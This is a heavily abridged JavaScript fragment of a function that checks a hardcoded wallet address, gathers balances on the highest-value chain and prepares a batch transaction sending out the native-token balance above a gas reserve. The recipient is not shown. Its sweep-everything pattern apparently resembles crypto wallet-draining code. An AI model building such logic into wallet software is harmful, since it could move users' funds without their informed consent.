...
async function performBatchOperations(mostExpensive, allBalances, state) {
  ...
  if (!state.address || state.address.toLowerCase() === '0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'.toLowerCase()) {
  ...
  if (nativeToken) {
    ...
    if (balanceWei > gasReserve) {
      ...
      transferCall = {
        ...
        data: '' // Empty data for native token transfer
      }
  ...
  console.log(`Preparing to send ${allCalls.length} calls:`, JSON.stringify(allCalls, null, 2))

  // Send batch transaction
  if (allCalls.length > 0) {
    try {
      console.log(`Sending batch transaction with chainId=${mostExpensive.chainId}, account=${state.address}`)
